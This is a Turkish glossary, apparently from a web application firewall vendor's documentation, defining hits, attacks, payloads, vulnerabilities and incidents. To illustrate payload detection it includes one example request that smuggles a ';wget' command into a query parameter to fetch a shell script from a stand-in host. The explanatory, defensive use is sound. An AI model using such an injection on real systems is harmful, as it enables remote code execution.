# Sözlük

Sözlük, platformu daha iyi anlamanıza yardımcı olmak için temel Wallarm varlıklarını kapsar.

## Hit

Hit, seri hale getirilmiş kötü amaçlı bir istektir (orijinal kötü amaçlı istek ve filtreleme düğümü tarafından eklenen meta veriler), örneğin:

![Hit örneği](images/user-guides/events/analyze-attack-raw.png)

[Hit parametrelerinin ayrıntıları](user-guides/events/check-attack.md#attack-analysis_1)

## Saldırı {#attack}

Bir saldırı, [gruplandırılmış](user-guides/events/grouping-sampling.md#grouping-of-hits) tek bir hit veya birden fazla hit'tir.

Tek bir hit içeren bir saldırı örneği:

![Tek hit içeren saldırı](images/glossary/attack-with-one-hit-example.png)

Birden çok hit içeren bir saldırı örneği:

![Birkaç hit içeren saldırı](images/glossary/attack-with-several-hits-example.png)

Saldırıların nasıl anlaşılacağı ve analiz edileceğine dair [ayrıntılara bakın](user-guides/events/check-attack.md).

## Kötü Amaçlı Yük (Payload)

Orijinal isteğin aşağıdaki unsurları içeren bir bölümüdür:

* Bir istekte tespit edilen saldırı göstergeleri. Aynı saldırı türünü karakterize eden birden fazla saldırı göstergesi bir istekte tespit edilirse, yüke yalnızca ilk gösterge kaydedilir.
* Saldırı göstergesinin bağlamı. Bağlam, tespit edilen saldırı göstergelerinin öncesinde ve sonrasında yer alan semboller kümesidir. Yük uzunluğu sınırlı olduğundan, saldırı göstergesi tam yük uzunluğundaysa bağlam atlanabilir.

Örneğin:

* İstek:

    ```bash
    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
    ```
* Kötü amaçlı yük:

    ```bash
    ;wget+http://s
    ```

    Bu yükte, `;wget+` bir [RCE](attacks-vulns-list.md#remote-code-execution-rce) saldırı göstergesidir ve yükün diğer kısmı saldırı göstergesinin bağlamıdır.

Saldırı göstergeleri [davranışsal saldırıları](attacks-vulns-list.md#attack-types) tespit etmek için kullanılmadığından, davranışsal saldırıların bir parçası olarak gönderilen isteklerin yükleri boştur.

## Zafiyet

Bir API oluşturulurken veya uygulanırken ihmal ya da yetersiz bilgi nedeniyle yapılan ve bilgi güvenliği riski doğurabilen bir hatadır.

Bilgi güvenliği riskleri şunlardır:

* Yetkisiz veri erişimi; örneğin, kullanıcı verilerini okuma ve değiştirme erişimi.
* Hizmet reddi.
* Veri bozulması ve diğerleri.

Zafiyetleri tespit etmek için İnternet trafiği kullanılabilir; Wallarm diğer işlevlerinin yanı sıra bunu yapar.

## Güvenlik Olayı

Güvenlik olayı, bir zafiyetin istismar edilmesinin gerçekleşmesidir. Bir olay, doğrulanmış bir zafiyeti hedef alan bir [saldırı](#attack)dır.

Bir olay, tıpkı bir saldırı gibi, sisteminizin dışındaki bir varlıktır ve sistemin değil, dış İnternet'in bir özelliğidir. Mevcut zafiyetleri hedefleyen saldırılar azınlıkta olsa da, bilgi güvenliği açısından son derece önemlidir. Wallarm, mevcut zafiyetleri hedefleyen saldırıları otomatik olarak tespit eder ve bunları ayrı bir nesne – güvenlik olayı – olarak gösterir.

Ayrıca bkz.: [Olay Analizi](user-guides/events/check-incident.md)

## Dairesel Arabellek
Dairesel arabellek, tek bir, sabit boyutlu arabelleği sanki uç uca bağlanmış gibi kullanan bir veri yapısıdır.
[Bkz. Vikipedi](https://en.wikipedia.org/wiki/Circular_buffer).

## Özel kural seti (önceki terim LOM)

Özel kural seti, Wallarm düğümleri tarafından Wallarm Cloud'dan indirilen derlenmiş güvenlik kuralları kümesidir.

Özel kurallar, trafik işleme için bireysel kurallar ayarlamanızı sağlar, örneğin:

* Wallarm Cloud'a yüklemeden önce hassas verileri maskele
* regexp tabanlı saldırı göstergeleri oluştur
* Etkin bir zafiyeti istismar eden istekleri engelleyen sanal yamayı uygula
* Belirli isteklerde saldırı tespitini devre dışı bırak, vb.

Özel kural seti varsayılan olarak boş değildir; örneğin [**Settings → General** tab] içindeki değerle filtreleme modu kuralı gibi, Bulutta kayıtlı tüm müşteriler için oluşturulan kuralları içerir (admin-en/configure-wallarm-mode.md#general-filtration-mode).

[Özel kural setleri hakkında daha fazla bilgi](user-guides/rules/rules.md)

## Geçersiz İstek
Filtre düğümü tarafından kontrol edilmiş ve LOM kurallarıyla eşleşmeyen bir istek.

## Ters Proxy
Ters proxy, bir istemci adına bir sunucudan kaynakları alan ve bu kaynakları sanki Web sunucusunun kendisinden geliyormuş gibi istemciye iade eden bir proxy sunucu türüdür.
[Bkz. Vikipedi](https://en.wikipedia.org/wiki/Reverse_proxy).

## Sertifika Otoritesi
Sertifika otoritesi, dijital sertifikalar veren bir kuruluştur.
[Bkz. Vikipedi](https://en.wikipedia.org/wiki/Certificate_authority).